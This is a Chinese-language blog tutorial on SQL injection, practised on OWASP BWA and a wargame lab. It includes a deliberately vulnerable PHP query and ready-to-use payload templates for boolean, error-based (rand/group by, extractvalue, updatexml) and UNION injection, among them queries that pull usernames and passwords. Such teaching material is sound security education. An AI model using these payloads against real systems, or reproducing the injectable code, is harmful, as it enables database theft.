---
title: 'SQL 注入详解'
layout: post
comments: true
date: 2016-10-01 21:09:44
tags: [Web安全, SQL注入]
categories: Web安全
description: SQL 注入 详解
photos:
- http://ww2.sinaimg.cn/mw690/e3dde130gw1f8hsvng0gcj20zk0o6k1e.jpg
- http://ww2.sinaimg.cn/small/e3dde130gw1f8hsvng0gcj20zk0o6k1e.jpg
---
从今年(2016) 6 月初来到南京( 841 研究所)实习，到现在四个月过去了，期间主要的工作还是研究 WEB 安全，编程语言是 Python，常用到正则表达式，对 HTTP 的协议也非常清晰。

<!--more-->

刚过来的时候，研究的主要是 SQL 注入，因为之前没有搞过安全，所有费了好长一段时间对 SQL 注入基本知识进行了解。**这篇文章并不是什么很深入的技术博客，或许应该叫它‘ SQL注入扫盲 ’**。

## 关于 SQL Injection

SQL Injection 就是通过把恶意的 SQL 命令插入到 Web 表单让服务器执行，最终达到欺骗服务器或数据库执行恶意的 SQL 命令。

学习 SQL 注入，首先要搭一个靶机环境，我使用的是 [OWASP BWA](https://www.owasp.org/index.php/GPC_Project_Details/OWASP_BWA_Project)，感兴趣的可以去官网下载一个安装，除了 SQL 注入，很多靶机环境都可以在 BWA 中找到，它专门为 [OWASP ZAP](https://github.com/zaproxy/zaproxy) 渗透工具设计的。

```
$id = $_GET['id'];
$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );
$num = mysql_numrows($result); 
```

这是一个很简单的 PHP代码，从前台获得 `id` 的值，交给数据库来执行，把结果返回给前台。

比如我们在 OWASP 里输入 `id = 1`，点击 Submit，返回结果如下：

![](/content/images/2016/10/p1.png)

稍微懂一点后台或者数据库的人都知道，上面的那段代码是有严重问题的，**没有对 id 的值进行有效性、合法性判断**。也就是说，我们在 submit 输入框输入的如何内容都会被提交给数据库执行，比如在输入框输入`1' or '1'='1`，执行就会变成：

```sql
//原先要在数据库中执行的命令
SELECT first_name, last_name FROM users WHERE user_id = '1'
//变成
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'
```

**注意一下单引号，这是 SQL 注入中非常重要的一个地方，所以注入代码的最后要补充一个 `'1'='1`让单引号闭合。**

由于 or 的执行，会把数据库表 users 中的所有内容显示出来，

![](/content/images/2016/10/p2.png)

下面对三种主要的注入类型进行介绍。

## Boolean-based 原理分析

首先不得不讲SQL中的AND和OR  
AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。  
AND:返回第一个条件和第二个条件都成立的记录。  
OR:返回满足第一个条件或第二个条件的记录。  
AND和OR即为集合论中的交集和并集。  
下面是一个数据库的查询内容。

```
mysql> select * from students;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)
```

1)

```
mysql> select * from students where TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)
```

2)

```
mysql> select * from students where FALSE ;
Empty set (0.00 sec)
```

3)

```
mysql> SELECT * from students where id = 10056 and TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
+-------+-------+-----+
1 row in set (0.00 sec)
```

4)

```
mysql> select * from students where id = 10056 and FALSE ;
Empty set (0.00 sec)
```

5)

```
mysql> selcet * from students where id = 10056 or TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)
```

6)

```
mysql> select * from students where id = 10056 or FALSE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
+-------+-------+-----+
1 row in set (0.00 sec)
```

**会发现and 1=1 , and 1=2 即是 and TRUE , and FALSE 的变种。**  
**这便是最基础的boolean注入,以此为基础你可以自由组合语句。**

字典爆破流

```
and exists(select * from ?)     //?为猜测的表名
and exists(select ? from x)     //?为猜测的列名
```

截取二分流

```
and (length((select schema_name from information_schema.schemata limit 1))>?)       //判断数据库名的长度
and (substr((select schema_name from information_schema.schemata limit 1),1,1)>'?')
and (substr((select schema_name from information_schema.schemata limit 1),1,1)<'?')      //利用二分法判断第一个字符
```

### Boolean-based总结

根据前面的介绍，我们知道，对于基于Boolean-based的注入，**必须要有一个可以正常访问的地址**，比如http: //redtiger.labs.overthewire.org/level4.php?id=1 是一个可以正常访问的记录，说明id=1的记录是存在的，下面的都是基于这个进一步猜测。先来判断一个关键字keyword的长度，在后面构造**id=1 and (select length(keyword) from table)=1**，从服务器我们会得到一个返回值，如果和先前的返回值不一样，说明and后面的**(select length(keyword) from table)=1返回false**，keyword的长度不等于1。继续构造直到id=1 and (select length(keyword) from table)=15返回true，说明keyword的长度为15。  

**为什么我们刚开始一定要找一个已经存在的id，其实这主要是为了构造一个为真的情况。Boolean-based就是利用查询结果为真和为假时的不同响应，通过不断猜测来找到自己想要的东西。**  

对于keyword的值，mysql数据库可以使用substr(string, start, length)函数，截取string从第start位开始的length个字符串id=1 and (select substr(keyword,1,1) from table) ='A'，依此类推，就可以获得keyword的在数据库中的值。  
Boolean-based的效率很低，需要多个请求才能确定一个值，尽管这种代价可以通过脚本来完成，在有选择的情况下，我们会优先选择其他方式。

## Error Based 原理分析

### 关于错误回显

基于错误回显的sql注入就是**通过sql语句的矛盾性来使数据被回显到页面上**。

所用到的函数

```
count() 统计元祖的个数（相当于求和）
如select count(*) from information_schema.tables;  

rand()用于产生一个0~1的随机数  

floor()向下取整  

group by 依据我们想要的规矩对结果进行分组  

concat将符合条件的同一列中的不同行数据拼接，以逗号隔开
```

### 用于错误回显的sql语句

**第一种： 基于 rand() 与 group by 的错误**

利用group by part of rand() returns duplicate key error这个bug，关于rand()函数与group by 在mysql中的错误报告如下：

**RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.  
You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.**

这个bug会爆出duplicate key这个错误，然后顺便就把数据偷到了。  
公式：**username=admin' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and '1' = '1**

**第二种： XPATH爆信息**

这里主要用到的是ExtractValue()和UpdateXML()这2个函数，由于mysql 5.1以后提供了内置的XML文件解析和函数，所以这种注入只能用于5.1版本以后使用

查看sql手册

```
语法：EXTRACTVALUE (XML_document, XPath_string);
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
```

作用：从目标XML中返回包含所查询值的字符串

```
语法:UPDATEXML (XML_document, XPath_string, new_value);
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
第三个参数：new_value，String格式，替换查找到的符合条件的数据
```

作用：改变文档中符合条件的节点的值

现在就很清楚了，我们只需要不满足XPath_string(Xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用  
公式1：**username=admin' and (extractvalue(1, concat(0x7e,(你想获取的数据的sql语句)))) and '1'='1**  
公式2：**username=admin' and (updatexml(1, concat(0x7e,(你想获取的数据的sql语句)),1)) and '1'='1**

 基于错误回显的注入，总结起来就一句话，通过sql语句的矛盾性来使数据被回显到页面上，但有时候局限于回显只能回显一条，导致基于错误的注入偷数据的效率并没有那么高，但相对于布尔注入已经提高了一个档次。

## union query injection

要了解union query injection，首先得了解union查询，union用于合并两个或更多个select的结果集。比如说

    SELECT username, password FROM account;

结果是

`admin 123456`

    SELECT id, title FROM article

的结果是

`1 Hello, World`

    SELECT username, password FROM account
    UNION 
    SELECT id, title FROM article

的结果就是

`admin 123456`

`1 Hello, World`

比起多重嵌套的boolean注入，union注入相对轻松。因为，union注入可以直接返回信息而不是布尔值。**前面的介绍看出把union会把结果拼拼到一起，所有要让union前面的查询返回一个空值，一般采用类似于id=-1的方式。**

1)

```
mysql> select name from students where id = -1 union select schema_name from information_schema.schemata;   //数据库名  
+--------------------+
| name               |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| rumRaisin          |
| t3st               |
| test               |
+--------------------+
6 rows in set (0.00 sec)
```

2)

```
mysql> select name from students where id = -1 union select table_name from information_schema.tables where table_schema='t3st';    //表名
+----------+
| name     |
+----------+
| master   |
| students |
+----------+
2   rows in set (0.00 sec)
```

3)

```
mysql> select name from students where id = -1 union select column_name from information_schema.columns where table_name = 'students' ;     //列名
+------+
| name |
+------+
| id   |
| name |
| age  |
+------+
3 rows in set (0.00 sec)
```

UNION 操作符用于合并两个或多个 SELECT 语句的结果集。**请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。**

举个例子，还以最开始的 OWASP 为基础，返回了两个值分别是 first_name 和 sur_name，可想而知，服务器在返回数据库的查询结果时，就会把结果中的第一个值和第二个值传给 first_name 和 sur_name，多了或少了，都会引起报错。

所以你如果想要使用union查询来进行注入，你首先要猜测后端查询语句中查询了多少列，哪些列可以回显给用户。

猜测列数

```
-1 union select 1
-1 union select 1,2
-1 union select 1,2,3
//直到页面正常显示
```

比如这条语句

    -1 UNION SELECT 1,2,3,4

如果显示的值为3和4，表示该查询结果中有四列，并且第三列和第四列是有用的。则相应的构造union语句如下

    -1 UNION SELECT 1,2,username,password FROM table

## 小结一下

SQL 注入大概有5种，还有两种分别是 Stacked_queries(基于堆栈)和 Time-based blind(时间延迟)，堆栈就是多语句查询，用 ‘;’ 把语句隔开，和 union 一样；时间延迟就是利用 sleep() 函数让数据库延迟执行，偷数据的速度很慢。(还有一个第六种，内联注入，但和前面涉及的内容有所重叠，就不单独来讨论了)

**引用说明**，自己之前研究 SQL 注入的时候，也是一点一点摸索的，本博客的大部分内容是来自于公司内网的服务器中(公司定期考核，看你都干了什么)。当时因为是内网，就没有做引用，现在想找到这些引用的文章也很困难，见谅。